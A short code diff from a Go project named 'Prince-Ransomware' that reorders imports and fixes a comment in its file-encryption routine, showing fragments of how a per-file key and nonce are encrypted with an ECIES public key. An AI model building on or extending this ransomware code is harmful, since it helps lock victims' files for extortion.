@@ -3,11 +3,12 @@ package encryption
 import (
 	Configuration "Prince-Ransomware/configuration"
 	"crypto/rand"
-	eciesgo "github.com/ecies/go"
-	"golang.org/x/crypto/chacha20"
 	"io"
 	"log"
 	"os"
+
+	eciesgo "github.com/ecies/go"
+	"golang.org/x/crypto/chacha20"
 )
 
 const (
@@ -60,7 +61,7 @@ func EncryptFile(filePath string) {
 		return
 	}
 
-	// Encrypt the key and nonce using RSA
+	// Encrypt the key and nonce using ECIES
 	encryptedKey, err := eciesgo.Encrypt(publicKey, key)
 	if err != nil {
 		return
